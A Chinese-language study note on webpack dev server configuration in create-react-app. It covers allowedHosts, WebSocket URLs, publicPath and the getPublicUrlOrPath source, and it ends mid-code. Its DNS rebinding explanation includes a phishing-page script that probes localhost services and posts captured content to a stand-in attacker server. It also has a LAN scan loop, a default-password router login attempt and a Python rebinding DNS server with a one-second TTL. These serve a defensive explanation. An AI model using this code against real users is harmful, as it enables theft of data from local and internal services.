## webpack dev server config (生产环境：Webpack Dev Server 本身就不用于生产，所以这个配置只存在于开发配置中)

```js
"use strict";

const fs = require("fs");
const evalSourceMapMiddleware = require("react-dev-utils/evalSourceMapMiddleware");
const noopServiceWorkerMiddleware = require("react-dev-utils/noopServiceWorkerMiddleware");
const ignoredFiles = require("react-dev-utils/ignoredFiles");
const redirectServedPath = require("react-dev-utils/redirectServedPathMiddleware");
const paths = require("./paths");
const getHttpsConfig = require("./getHttpsConfig");

const host = process.env.HOST || "0.0.0.0";
const sockHost = process.env.WDS_SOCKET_HOST;
const sockPath = process.env.WDS_SOCKET_PATH; // default: '/ws'
const sockPort = process.env.WDS_SOCKET_PORT;

module.exports = function (proxy, allowedHost) {
  const disableFirewall =
    !proxy || process.env.DANGEROUSLY_DISABLE_HOST_CHECK === "true";
  return {
    // WebpackDevServer 2.4.3 introduced a security fix that prevents remote
    // websites from potentially accessing local content through DNS rebinding:
    // https://github.com/webpack/webpack-dev-server/issues/887
    // https://medium.com/webpack/webpack-dev-server-middleware-security-issues-1489d950874a
    // However, it made several existing use cases such as development in cloud
    // environment or subdomains in development significantly more complicated:
    // https://github.com/facebook/create-react-app/issues/2271
    // https://github.com/facebook/create-react-app/issues/2233
    // While we're investigating better solutions, for now we will take a
    // compromise. Since our WDS configuration only serves files in the `public`
    // folder we won't consider accessing them a vulnerability. However, if you
    // use the `proxy` feature, it gets more dangerous because it can expose
    // remote code execution vulnerabilities in backends like Django and Rails.
    // So we will disable the host check normally, but enable it if you have
    // specified the `proxy` setting. Finally, we let you override it if you
    // really know what you're doing with a special environment variable.
    // Note: ["localhost", ".localhost"] will support subdomains - but we might
    // want to allow setting the allowedHosts manually for more complex setups
    allowedHosts: disableFirewall ? "all" : [allowedHost],
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "*",
      "Access-Control-Allow-Headers": "*",
    },
    // Enable gzip compression of generated files.
    compress: true,
    static: {
      // By default WebpackDevServer serves physical files from current directory
      // in addition to all the virtual build products that it serves from memory.
      // This is confusing because those files won’t automatically be available in
      // production build folder unless we copy them. However, copying the whole
      // project directory is dangerous because we may expose sensitive files.
      // Instead, we establish a convention that only files in `public` directory
      // get served. Our build script will copy `public` into the `build` folder.
      // In `index.html`, you can get URL of `public` folder with %PUBLIC_URL%:
      // <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
      // In JavaScript code, you can access it with `process.env.PUBLIC_URL`.
      // Note that we only recommend to use `public` folder as an escape hatch
      // for files like `favicon.ico`, `manifest.json`, and libraries that are
      // for some reason broken when imported through webpack. If you just want to
      // use an image, put it in `src` and `import` it from JavaScript instead.
      directory: paths.appPublic,
      publicPath: [paths.publicUrlOrPath],
      // By default files from `contentBase` will not trigger a page reload.
      watch: {
        // Reportedly, this avoids CPU overload on some systems.
        // https://github.com/facebook/create-react-app/issues/293
        // src/node_modules is not ignored to support absolute imports
        // https://github.com/facebook/create-react-app/issues/1065
        ignored: ignoredFiles(paths.appSrc),
      },
    },
    client: {
      webSocketURL: {
        // Enable custom sockjs pathname for websocket connection to hot reloading server.
        // Enable custom sockjs hostname, pathname and port for websocket connection
        // to hot reloading server.
        hostname: sockHost,
        pathname: sockPath,
        port: sockPort,
      },
      overlay: {
        errors: true,
        warnings: false,
      },
    },
    devMiddleware: {
      // It is important to tell WebpackDevServer to use the same "publicPath" path as
      // we specified in the webpack config. When homepage is '.', default to serving
      // from the root.
      // remove last slash so user can land on `/test` instead of `/test/`
      publicPath: paths.publicUrlOrPath.slice(0, -1),
    },

    https: getHttpsConfig(),
    host,
    historyApiFallback: {
      // Paths with dots should still use the history fallback.
      // See https://github.com/facebook/create-react-app/issues/387.
      disableDotRule: true,
      index: paths.publicUrlOrPath,
    },
    // `proxy` is run between `before` and `after` `webpack-dev-server` hooks
    proxy,
    onBeforeSetupMiddleware(devServer) {
      // Keep `evalSourceMapMiddleware`
      // middlewares before `redirectServedPath` otherwise will not have any effect
      // This lets us fetch source contents from webpack for the error overlay
      devServer.app.use(evalSourceMapMiddleware(devServer));

      if (fs.existsSync(paths.proxySetup)) {
        // This registers user provided middleware for proxy reasons
        require(paths.proxySetup)(devServer.app);
      }
    },
    onAfterSetupMiddleware(devServer) {
      // Redirect to `PUBLIC_URL` or `homepage` from `package.json` if url not match
      devServer.app.use(redirectServedPath(paths.publicUrlOrPath));

      // This service worker file is effectively a 'no-op' that will reset any
      // previous service worker registered for the same host:port combination.
      // We do this in development to avoid hitting the production cache if
      // it used the same host and port.
      // https://github.com/facebook/create-react-app/issues/2272#issuecomment-302832432
      devServer.app.use(noopServiceWorkerMiddleware(paths.publicUrlOrPath));
    },
  };
};
```

### \_\_dirname, \_\_filename, process.cwd()

- \_\_dirname
  - 当前文件所在的目录
  - `/home/user/projects/my-app`

- \_\_filename
  - 当前文件的完整路径
  - `/home/user/projects/my-webpack.config.js`

- process.cwd()
  - 进程启动时的目录
  - 取决于你在哪里运行 npm start

### allowedHosts - 主机安全检查

作用：

- 安全限制，防止 DNS 重绑定攻击

- 当使用 proxy 时更严格，否则允许所有主机访问

#### allowedHosts 可以防止 dns 重绑定攻击，dns 重绑定攻击是什么，防御原理又是什么

##### DNS 重绑定攻击（DNS Rebinding Attack）

- 这是一种利用 DNS 机制绕过同源策略（Same-Origin Policy）的攻击方式。

##### 攻击原理

1. 同源策略的限制
   - 浏览器只允许网页访问相同协议、域名、端口的资源。

2. DNS 的工作方式
   - 域名解析为 IP 地址
   - DNS 响应有 TTL（生存时间）
   - 浏览器缓存 DNS 结果

绕过同源策略 (SOP) 的机制

- 浏览器的同源策略（Same-Origin Policy）规定，脚本只能访问协议、域名和端口完全相同的资源。
  重绑定原理：攻击者首先让浏览器访问一个受控域名（如 attacker.com:8080），随后通过修改 DNS 解析，将该域名指向内网 IP（如 127.0.0.1）。
- 端口一致性要求：为了保持“同源”，后续发送到内网 IP 的请求必须使用与初始页面相同的端口。例如，如果初始页面在 8080 端口加载，那么它只能攻击内网中同样监听 8080 端口的服务。
- 同源是指“协议+域名+端口”三者相同，而不是“协议+IP+端口”。

##### 攻击案例

```
情景设定
假设你是一个开发者：

在本地运行Webpack Dev Server：http://localhost:3000

还在运行一个本地数据库管理界面：http://localhost:8081/phpmyadmin

公司内网有个路由器：http://192.168.1.1


攻击者的准备
1. 攻击者注册一个域名
evil-attacker.com

2. 攻击者设置特殊的DNS服务器
// DNS服务器配置：
evil-attacker.com 解析到:
- 第一秒: 45.33.32.65 (攻击者自己的服务器IP)
- 第二秒: 127.0.0.1 (你的本地机器)
- TTL: 1秒 (非常短的生存时间)

攻击过程 - 像看电影一样
第一幕：你访问了恶意网站
# 周一早上，你收到一封邮件：
"恭喜！你获得了免费Starbucks咖啡券！"
# 你点击链接：http://evil-attacker.com


第二幕：恶意页面加载
<!-- evil-attacker.com 的页面看起来很正常 -->
<!DOCTYPE html>
<html>
<head>
    <title>免费咖啡券！</title>
</head>
<body>
    <h1>填写信息领取咖啡券</h1>
    <script>
        // 这里隐藏着恶意代码
        const maliciousScript = `
            setTimeout(() => {
                // 1. 尝试访问你的本地开发服务
                fetch('http://evil-attacker.com:3000/')
                    .then(res => res.text())
                    .then(data => {
                        if (data.includes('webpack')) {
                            // 发现了开发服务器！
                            fetch('https://real-attacker-server.com/log', {
                                method: 'POST',
                                body: JSON.stringify({
                                    type: 'dev_server_found',
                                    content: data
                                })
                            });
                        }
                    });

                // 2. 尝试访问数据库管理界面
                fetch('http://evil-attacker.com:8081/phpmyadmin')
                    .then(res => res.text())
                    .then(data => {
                        // 窃取数据库信息
                    });

                // 3. 扫描内网设备
                for (let i = 1; i < 255; i++) {
                    fetch(\`http://evil-attacker.com/\${i}:80\`)
                        .catch(() => {});
                }
            }, 2000);
        `;

        // 执行恶意代码
        eval(maliciousScript);
    </script>
</body>
</html>

第三幕：DNS魔术开始
时间线：

T=0秒 - 你点击链接
你的浏览器: "DNS服务器，evil-attacker.com 的IP是多少？"
DNS服务器: "是 45.33.32.65 (攻击者服务器)"
浏览器缓存这个结果1秒

T=1秒 - 页面加载完成，恶意代码准备执行
DNS缓存过期


T=2秒 - 恶意代码开始执行
// 浏览器要访问 evil-attacker.com:3000
// 首先需要重新解析域名
// 浏览器: "DNS服务器，evil-attacker.com 的IP是多少？"
// DNS服务器: "现在是 127.0.0.1 (你的本地机器)"


第四幕：绕过同源策略的关键
// 浏览器看到：
fetch('http://evil-attacker.com:3000/')

// 浏览器思考：
// 1. 当前页面来源：http://evil-attacker.com (来自 45.33.32.65)
// 2. 请求目标：http://evil-attacker.com:3000 (现在解析到 127.0.0.1)
// 3. 判断：域名都是 evil-attacker.com → 同源！允许访问！

// 但实际上：
// 请求从 evil-attacker.com (45.33.32.65) 发向 evil-attacker.com (127.0.0.1)
// 完全绕过了同源策略！


如果Webpack Dev Server没有防御...
请求到达你的开发服务器 (127.0.0.1:3000)

HTTP请求：
GET / HTTP/1.1
Host: evil-attacker.com:3000  ← 注意这个Host头！
Accept: */*
Origin: http://evil-attacker.com  ← 来源也是evil-attacker.com

你的Dev Server看到：
- Host: evil-attacker.com:3000
- 检查 allowedHosts 配置
- 如果是 'all' 或包含 'evil-attacker.com'
- 允许访问！返回数据给攻击者



更危险的场景：有proxy配置时
// 你的devserver配置
devServer: {
  proxy: {
    '/api': {
      target: 'http://localhost:8080',  // 你的后端API
      pathRewrite: {'^/api': ''}
    }
  }
}

攻击者可以：
// 通过你的dev server访问后端API
fetch('http://evil-attacker.com:3000/api/users')

// Dev Server会：
// 1. 接收请求 (Host: evil-attacker.com:3000)
// 2. 如果 allowedHosts 不严格
// 3. 代理到 http://localhost:8080/users
// 4. 返回敏感用户数据！
```

现实中的攻击目标

```
// 常见本地服务端口
const commonPorts = [3000, 8080, 8081, 9000, 4200, 8000];
const services = {
  3000: 'React开发服务器',
  8080: 'Spring Boot后端',
  8081: '数据库管理',
  9000: 'Angular开发服务器',
  3306: 'MySQL数据库',
  6379: 'Redis数据库',
  27017: 'MongoDB数据库'
};

// 攻击者可以扫描这些端口

// 常见内网IP段
const internalRanges = [
  '192.168.0.',  // 家庭网络
  '192.168.1.',  // 常见路由器
  '10.0.0.',     // 企业网络
  '172.16.0.'    // 大型网络
];

// 攻击路由器管理界面
fetch('http://evil-attacker.com/')  // 实际是 192.168.1.1
  .then(res => res.text())
  .then(html => {
    if (html.includes('路由器登录')) {
      // 尝试默认密码
      fetch('http://evil-attacker.com/login', {
        method: 'POST',
        body: 'username=admin&password=admin'
      });
    }
  });
```

为什么这个攻击很隐蔽？

1. 用户完全不知情
   - 只是访问了一个普通网站

   - 没有下载任何软件

   -没有输入任何密码

2. 利用了浏览器正常功能
   - DNS 解析是正常的

   - 同源策略是正常工作的

   - JavaScript fetch 是正常 API

##### allowedhosts 是如何防止 dns 重绑定攻击的

```
正确的防御配置：
devServer: {
  allowedHosts: ['localhost', '127.0.0.1', '.mycompany.com']
  // 只允许这些主机访问
}

防御过程：
恶意请求到达：

HTTP请求：
GET / HTTP/1.1
Host: evil-attacker.com:3000  ← 关键在这里！

Dev Server检查：
1. 提取Host头：evil-attacker.com:3000
2. 去掉端口：evil-attacker.com
3. 检查是否在 allowedHosts 列表中
4. evil-attacker.com 不在列表中！
5. 拒绝请求！返回403 Forbidden

```

##### 这个问题主要利用 DNS TTL 机制：快速变更 IP 地址，进行攻击。什么是 dns ttl 机制

DNS TTL 机制详解：TTL 是 Time To Live（生存时间）的缩写，它是 DNS 系统中一个非常重要的安全和控制机制。

TTL 是一个时间值（单位：秒），表示：

- DNS 记录可以被缓存多久

- 缓存过期后，需要重新查询

- 由域名管理员设置

DNS 查询过程（带 TTL）

```
// 模拟DNS查询过程
const dnsQuery = {
  domain: "github.com",
  step1: "浏览器检查本地缓存",
  step2: "本地缓存没有 → 查询系统DNS缓存",
  step3: "系统缓存没有 → 查询ISP的DNS服务器",
  step4: "ISP服务器返回：IP = 140.82.121.3, TTL = 600秒",
  step5: "浏览器缓存这个结果600秒"
};
```

不同的 TTL 策略

```
# 各种网站的TTL策略示例：

长期稳定的网站:
- google.com: TTL = 300秒 (5分钟)
- facebook.com: TTL = 600秒 (10分钟)
- 银行官网: TTL = 3600秒 (1小时)

经常变化的服务:
- CDN节点: TTL = 30-60秒 (快速切换)
- 负载均衡: TTL = 20秒 (快速故障转移)
- 云服务: TTL = 10秒 (弹性伸缩)

特殊用途:
- 故障转移: TTL = 5秒 (极速切换)
- DNS重绑定攻击: TTL = 1秒 (快速变化)
```

案例 1：Google 的 TTL 策略

```
; Google使用较短的TTL实现全球负载均衡
google.com.       300 IN A 142.250.185.174  ; 5分钟TTL
www.google.com.   300 IN A 142.250.185.174

; 但不同地区可能返回不同IP
; 亚洲用户: 172.217.24.14
; 欧洲用户: 216.58.213.174
; TTL短才能快速切换

```

案例 2：Cloudflare 的任播网络

```
; Cloudflare利用短TTL实现智能路由
cloudflare.com.   30 IN A 104.17.210.9     ; 仅30秒TTL

; 根据用户位置和网络状况
; 动态返回最近的服务器IP
; 短TTL确保变化快速生效
```

案例 3：攻击者的配置

```
# 攻击者DNS服务器代码示例
from dnslib import *

def handle_dns_request(request):
    domain = str(request.q.qname)

    if domain == "evil-attacker.com.":
        # 动态改变IP
        current_time = time.time()
        if current_time % 2 < 1:  # 每秒切换
            ip = "45.33.32.65"   # 攻击者服务器
        else:
            ip = "127.0.0.1"     # 用户本地

        # 设置极短TTL
        reply = request.reply()
        reply.add_answer(
            RR(domain, QTYPE.A,
               rdata=A(ip),
               ttl=1)  # TTL=1秒！
        )
        return reply
```

### webSocketURL（只在开发环境下配置）

此选项允许指定 WebSocket 服务器的 URL（在代理开发服务器时很有用，因为客户端脚本不知道要连接到哪里）。
你还可以指定一个带有以下属性的对象：

```
hostname：告诉连接到开发服务器的客户端要使用的主机名。
pathname：告诉连接到开发服务器的客户端要使用的路径。
password：告诉连接到开发服务器的客户端要使用的密码进行认证。
port：告诉连接到开发服务器的客户端要使用的端口。
protocol：告诉连接到开发服务器的客户端要使用的协议。
username：告诉连接到开发服务器的客户端要使用的用户名进行认证。
```

默认走本机 dev serve 的地址

#### 主要作用

这个配置主要针对以下用处：

1. 热模块替换（HMR）（配合`hot: true`配置）

```js
// Webpack Dev Server 通过 WebSocket 向客户端推送更新
// 当代码变化时：
// 1. Webpack 重新编译
// 2. Dev Server 通过 WebSocket 通知客户端
// 3. 客户端接收新模块并热替换
devServer: {
  hot: true, // 启用热更新
  client: {
    webSocketURL: 'ws://localhost:8080/ws' // 热更新通信地址
  }
}
```

2. 实时错误和警告（配合 overlay 配置）

```
// WebSocket 还用于传输：
// - 编译错误信息
// - 警告信息
// - 编译状态更新
```

3. 开发服务器日志（配置 logging）

```
// 开发时的各种日志信息也通过 WebSocket 推送到浏览器控制台
```

#### 默认配置如何工作？

```
// Webpack Dev Server 的默认热更新流程：
1. 页面加载时注入客户端脚本（webpack-dev-server/client）
2. 客户端自动连接到：
   - 当前页面的 hostname + port
   - 加上 /ws 路径
3. 建立 WebSocket 连接监听热更新
4. 接收并应用模块更新
```

#### 什么时候配置 webSocketURL???

关键问题："客户端看到的服务器地址" ≠ "服务器实际监听的地址"

1. 场景 1：Docker/NPM Scripts 开发

```
// package.json
{
  "scripts": {
    "dev": "webpack serve --host 0.0.0.0 --port 3000"
  }
}

// 在 Docker 容器中运行：
// 容器内：server 监听 0.0.0.0:3000
// 浏览器在宿主机上：http://localhost:3000

// 问题：浏览器尝试连接 ws://0.0.0.0:3000/ws ❌
// 应该连接：ws://localhost:3000/ws ✅

// 配置：
devServer: {
  host: '0.0.0.0',
  port: 3000,
  client: {
    webSocketURL: {
      hostname: 'localhost', // 告诉浏览器用这个地址
      port: 3000
    }
  }
}
```

2. 在代理开发服务器时很有用，因为客户端脚本不知道要连接到哪里（反向代理，企业常见）

```
// 开发环境通过公司代理访问
// 实际访问：https://dev-frontend.company.com
// 代理到：http://localhost:8080

devServer: {
  port: 8080,
  client: {
    webSocketURL: 'wss://dev-frontend.company.com/ws' // 告诉浏览器走代理
  }
}

// 否则浏览器会尝试连接：ws://localhost:8080/ws
// 但 localhost:8080 被公司防火墙阻止了
```

3. 场景 3：HTTPS 开发

```
devServer: {
  https: true, // 服务器用 HTTPS
  client: {
    webSocketURL: {
      protocol: 'wss' // 必须告诉客户端用 wss 而不是 ws
      // 如果不配置，客户端可能错误地使用 ws://
    }
  }
}
```

4. 场景 4：自定义 WebSocket 路径

```
// 一些公司有安全策略，需要特定路径
devServer: {
  client: {
    webSocketURL: {
      pathname: '/my-custom-ws-path' // 而不是默认的 /ws
    }
  }
}
```

为什么不是"固定好的"？
不同情况需要告诉客户端怎么连上开发环境的 websocket

```
// 开发者的视角：http://localhost:3000
// 服务器的视角：0.0.0.0:3000
// Docker 的视角：172.17.0.2:3000
// 手机的视角：192.168.1.100:3000

// 每个"视角"都需要不同的 WebSocket 地址！
```

### webpack-dev-middleware

https://github.com/webpack/webpack-dev-middleware
webpack-dev-middleware 是一个 Webpack 开发中间件，主要作用是在开发环境中将 Webpack 编译的结果提供给服务器使用。下面是它的核心作用和特点：

主要作用:

1. 内存编译
   - 将编译后的文件存储在内存中，而不是写入磁盘

   - 大幅提升开发时的构建速度（特别是对于大量文件）

   - 减少磁盘 I/O 操作

2. 实时编译
   - 监视文件变化，自动重新编译

   - 保持内存中的文件始终是最新版本

   - 支持热模块替换（HMR）的底层支持

3. 与开发服务器集成
   - 通常与 webpack-dev-server 或 Express/Koa 等 Node.js 服务器配合使用

   - 作为中间件处理资源请求

典型使用场景:

```
// 配合 Express 使用
const express = require('express');
const webpack = require('webpack');
const webpackMiddleware = require('webpack-dev-middleware');
const config = require('./webpack.config.js');

const app = express();
const compiler = webpack(config);

app.use(webpackMiddleware(compiler, {
  publicPath: config.output.publicPath,
  stats: 'minimal'
}));

app.listen(3000);
```

与 webpack-dev-server 的关系

- webpack-dev-server：一个完整的开发服务器，内部使用了 webpack-dev-middleware

- webpack-dev-middleware：更底层的中间件，可以集成到自定义服务器中

- `webpack-dev-middleware.publicPath`
  - 属于 webpack dev server 的配置，定义
  - 定义了开发服务器关于编译后的内容的路径映射，与 `webpack-dev-middleware.publicPath` 一样，配置为相同的值

### `static.publicPath` , `output.publicPath`

- `webpack-dev-middleware.publicPath` 和 `static.publicPath`
  - 属于 webpack dev server 的配置，定义
  - 定义了开发服务器关于编译后的内容的路径映射，与 `static.publicPath`一样，配置为相同的值

- `output.publicPath`
  - 属于打包构建 webpack config 的配置
  - The publicPath configuration option can be quite useful in a variety of scenarios. It allows you to specify the base path for all the assets within your application
  - 允许您为应用程序中的所有资源指定基本路径（物理磁盘位置）

cra 给出的解释：

```js
// By default WebpackDevServer serves physical files from current directory
// in addition to all the virtual build products that it serves from memory.
// This is confusing because those files won’t automatically be available in
// production build folder unless we copy them. However, copying the whole
// project directory is dangerous because we may expose sensitive files.
// Instead, we establish a convention that only files in `public` directory
// get served. Our build script will copy `public` into the `build` folder.
// In `index.html`, you can get URL of `public` folder with %PUBLIC_URL%:
// <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
// In JavaScript code, you can access it with `process.env.PUBLIC_URL`.
// Note that we only recommend to use `public` folder as an escape hatch
// for files like `favicon.ico`, `manifest.json`, and libraries that are
// for some reason broken when imported through webpack. If you just want to
// use an image, put it in `src` and `import` it from JavaScript instead.
```

先说总结：

1. 默认情况下，WebpackDevServer 除了从内存中提供所有虚拟构建产物外，还会提供当前目录中的物理文件（引用的静态资源）。
2. 这容易让人困惑，因为除非我们复制它们，否则这些文件不会自动出现在生产构建文件夹中。然而，复制整个项目目录很危险，因为这可能会暴露敏感文件。
3. 因此，我们制定了一个约定，即只提供 `public` 目录中的文件。我们的构建脚本会将 `public` 目录复制到 `build` 文件夹中。
4. 在 `index.html` 中，您可以使用 `%PUBLIC_URL%` 获取 `public` 文件夹的 URL：`<link rel="icon" href="%PUBLIC_URL%/favicon.ico">`
5. 在 JavaScript 代码中，您可以使用 `process.env.PUBLIC_URL` 访问它。

可以理解为：

- dev server 的 publicPath，就是路径映射，告诉devserver模拟出一个路径，就是存放这些静态资源的，然后浏览器通过访问这个路径（注意，只是前缀，还要加上fileName之类的），devserver返回这些静态资源
- 打包结果的publicPath，就是打包后，访问这些静态资源实际的路径（注意，只是前缀，还要加上fileName之类的）
- 静态资源有两种
  - 一种是public 目录上，这种通常在index.html直接拿取
  - 一种是app项目的静态资源，应用代码用到的图片等等，一般不放在public下，放在src/某个路径下（也可以放在在public）
    - 因为对于程序的静态资源，打包工具一般都会hash它，然后打包放在一个目录下（和output有关系），例如static/media，程序的访问该资源的路径就是对应这个路径
    - 但如果你放在public里了，因为已经在一开始的时候被copy进打包目录了，然后webpack又处理一遍，放在一个别的目录下，static/media，而且程序的访问该资源的路径就是对应这个路径，所以原来在public那里的属于没有用到的资源（所以为什么区分是index.html直接用到的就放在public目录下，程序代码的静态资源就不放在public下）
- 有点要注意点是：程序代码中的svg通常会有特殊的loader去处理，然后打包的时候把它作为内嵌元素去使用，不额外缓存这个文件

```
提供静态文件服务：webpack-dev-server 默认从内存提供打包后的文件，但还需要为项目中的静态文件（如图片、字体、HTML 等）提供服务。
指定静态资源目录：directory: paths.appPublic 告诉 dev-server 从哪个目录提供静态文件。通常是项目的 public 文件夹。
访问路径映射：publicPath: [paths.publicUrlOrPath] 指定这些静态文件在开发服务器中的访问路径。
```

另外静态资源有两种：

- public index html 直接加载的资源(例如浏览器tab使用的icon)

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta
      name="description"
      content="Web site created using create-react-app"
    />
    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
    <!--
      manifest.json provides metadata used when your web app is installed on a
      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
    -->
    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
    <!--
      Notice the use of %PUBLIC_URL% in the tags above.
      It will be replaced with the URL of the `public` folder during the build.
      Only files inside the `public` folder can be referenced from the HTML.

      Unlike "/favicon.ico" or "favicon.ico", "%PUBLIC_URL%/favicon.ico" will
      work correctly both with client-side routing and a non-root public URL.
      Learn how to configure a non-root public URL by running `npm run build`.
    -->
    <title>React App</title>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
    <!--
      This HTML file is a template.
      If you open it directly in the browser, you will see an empty page.

      You can add webfonts, meta tags, or analytics to this file.
      The build step will place the bundled scripts into the <body> tag.

      To begin the development, run `npm start` or `yarn start`.
      To create a production bundle, use `npm run build` or `yarn build`.
    -->
  </body>
</html>
```

- 经过打包处理后的静态资源（应用程序代码直接使用的静态资源，在这里对应src/logo.svg）
  // src="/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg"（这个就是打包后的静态资源，这才和output的publicPath 和 path 有关系）

```html
<div id="root">
  <div class="App">
    <header class="App-header">
      <img
        class="App-logo"
        alt="logo"
        src="/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg"
      />
      <p>Edit <code>src/App.js</code> and save to reload.</p>
      <a
        class="App-link"
        href="https://reactjs.org"
        target="_blank"
        rel="noopener noreferrer"
        >Learn React</a
      >
    </header>
  </div>
</div>
```

devServer.static 配置，用于配置静态文件服务

```
devServer: {
  static: {
    // 静态文件的实际存放目录
    directory: path.join(__dirname, 'assets'),

    // 访问这些静态文件的URL路径前缀
    publicPath: '/serve-public-path-url',
  },
}

```

假设你的开发服务器运行在 http://localhost:8080：

```
访问 URL: http://localhost:8080/serve-public-path-url/logo.png
对应文件: 项目根目录/assets/logo.png

访问 URL: http://localhost:8080/serve-public-path-url/css/style.css
对应文件: 项目根目录/assets/css/style.css
```

#### 有 directory 不就是能访问了吗，为什么需要 publicPath?

核心区别

- directory：告诉 devServer 从哪个物理文件夹读取文件
- publicPath：告诉 devServer 通过什么 URL 路径提供这些文件

类比解释

- directory = 书库的位置（在哪栋楼、哪个房间）
- publicPath = 借书处的编号/入口（读者通过什么编号借书）

情况 1：只有 directory

```
devServer: {
  static: {
    directory: path.join(__dirname, 'assets'),
    // 没有 publicPath
  },
}

物理文件：项目/assets/logo.png
访问方式：http://localhost:8080/logo.png
问题：直接挂在根路径，可能与你的路由冲突


```

情况 2：有 directory + publicPath

```
devServer: {
  static: {
    directory: path.join(__dirname, 'assets'),
    publicPath: '/static',  // 添加了 publicPath
  },
}

物理文件：项目/assets/logo.png

访问方式：http://localhost:8080/static/logo.png

优点：有命名空间，不容易冲突
// 没有 publicPath 的问题
物理文件: assets/login.jpg
访问 URL: http://localhost:8080/login.jpg // ❌ 可能被路由拦截

// 有 publicPath 的解决方案
物理文件: assets/login.jpg
访问 URL: http://localhost:8080/static/login.jpg // ✅ 明确是静态资源
```

为什么 dev server 可以做这个映射？：
Dev Server 不使用实际的文件系统，而是内存中的虚拟文件系统（webpack-dev-middleware）

生产环境不会这样做是因为它不是由 dev server 去管理，它取决于开发者将它部署到什么环境：

场景 1：CDN 部署

```

典型 CDN 部署架构

开发者本地 CDN 服务器 用户浏览器
│ │ │
│ 1. 构建应用 │ │
├─────────────────────►│ │
│ 2. 上传 dist/ 到 CDN│ │
│ │ │
│ 3. 部署主站HTML │ │
│ │ │
│ │ 4. 用户访问主站 │
│ │◄──────────────────────┤
│ │ │
│ │ 5. 从CDN加载资源 │
│ │◄──────────────────────┤
│ │ │

```

webapck 配置：

```js

// webpack.config.js
const isProduction = process.env.NODE_ENV === 'production';

module.exports = {
output: {
path: path.resolve(\_\_dirname, 'dist'), // 本地构建目录
filename: 'js/[name].[contenthash:8].js',
chunkFilename: 'js/[name].[contenthash:8].chunk.js',
publicPath: isProduction
? 'https://cdn.yourdomain.com/' // 生产环境用CDN
: '/' // 开发环境用本地
},

module: {
rules: [
{
test: /\.(png|jpe?g|gif|svg)$/,
use: [
{
loader: 'url-loader',
options: {
limit: 8192,
name: 'images/[name].[hash:8].[ext]',
// publicPath 会覆盖这里的路径！
publicPath: isProduction
? 'https://cdn.yourdomain.com/images/'
: '/images/'
}
}
]
}
]
}
};

```

构建结果对比

开发环境构建 (publicPath: '/'):

```

<!-- index.html -->
<script src="/js/main.abc123.js"></script>
<img src="/images/logo.def456.png">
<!-- 从本地服务器加载 -->
```

生产环境构建 (publicPath: 'https://cdn.yourdomain.com/'):

```
<!-- index.html -->
<script src="https://cdn.yourdomain.com/js/main.abc123.js"></script>
<img src="https://cdn.yourdomain.com/images/logo.def456.png">
<!-- 从CDN加载 -->
```

#### 配置publicPath的 getPublicUrlOrPath 源码

```js
/**
 * Returns a URL or a path with slash at the end
 * In production can be URL, abolute path, relative path
 * In development always will be an absolute path
 * In development can use `path` module functions for operations
 *
 * @param {boolean} isEnvDevelopment
 * @param {(string|undefined)} homepage a valid url or pathname
 * @param {(string|undefined)} envPublicUrl a valid url or pathname
 * @returns {string}
 */
function getPublicUrlOrPath(isEnvDevelopment, homepage, envPublicUrl) {
  const stubDomain = "https://create-react-app.dev";

  if (envPublicUrl) {
    // ensure last slash exists
    envPublicUrl = envPublicUrl.endsWith("/")
      ? envPublicUrl
      : envPublicUrl + "/";

    // validate if `envPublicUrl` is a URL or path like
    // `stubDomain` is ignored if `envPublicUrl` contains a domain
    const validPublicUrl = new URL(envPublicUrl, stubDomain);

    return isEnvDevelopment
      ? envPublicUrl.startsWith(".")
        ? "/"
        : validPublicUrl.pathname
      : // Some apps do not use client-side routing with pushState.
        // For these, "homepage" can be set to "." to enable relative asset paths.
        envPublicUrl;
  }

  if (homepage) {
    // strip last slash if exists
    homepage = homepage.endsWith("/") ? homepage : homepage + "/";

    // validate if `homepage` is a URL or path like and use just pathname
    const validHomepagePathname = new URL(homepage, stubDomain).pathname;
    return isEnvDevelopment
      ? homepage.startsWith(".")
        ? "/"
        : validHomepagePathname
      : // Some apps do not use client-side routing with pushState.
        // For these, "homepage" can be set to "." to enable relative asset paths.
        homepage.startsWith(".")
        ? homepage
        : validHomepagePathname;
  }

  return "/";
}
```

#### 实例解释

```js
envPublicUrl = envPublicUrl.endsWith("/") ? envPublicUrl : envPublicUrl + "/";

return isEnvDevelopment // 第一层条件：是否是开发环境
  ? envPublicUrl.startsWith(".") // 开发环境分支：是否以 "." 开头
    ? "/" // 以 "." 开头 → 返回 "/"
    : validPublicUrl.pathname // 不以 "." 开头 → 返回路径部分
  : envPublicUrl; // 生产环境 → 直接返回配置值
```

1. 开发环境逻辑 (isEnvDevelopment 为 true)

```js
envPublicUrl.startsWith(".") ? "/" : validPublicUrl.pathname;
```

    -  envPublicUrl.startsWith('.') ? '/'

        - 条件：envPublicUrl 以点号开头（如 ./、../app）
        - 返回：/
        - 原因：开发环境使用 Webpack Dev Server，通常运行在 http://localhost:3000
              - 相对路径（.）在开发服务器中应该解析为根路径
              - 示例：PUBLIC_URL="./assets" 在开发时应该从 /assets 加载

    - validPublicUrl.pathname
        - 条件：envPublicUrl 不以点号开头
        - 返回：validPublicUrl.pathname（URL 的路径部分）
        - 示例：

        ```js
        // 假设 envPublicUrl = "/myapp"
          const validPublicUrl = new URL("/myapp", "https://create-react-app.dev");
          validPublicUrl.pathname; // 返回 "/myapp/"

          // 假设 envPublicUrl = "https://example.com/app"
          const validPublicUrl = new URL("https://example.com/app", stubDomain);
          validPublicUrl.pathname; // 返回 "/app/"
        ```

实际使用示例
示例 1：开发环境，相对路径

```js
isEnvDevelopment = true;
envPublicUrl = "./";
// 1. startsWith('.') 检查 → true
// 返回: "/"

output: {
      // The build folder.
      path: paths.appBuild,
      // Add /* filename */ comments to generated require()s in the output.
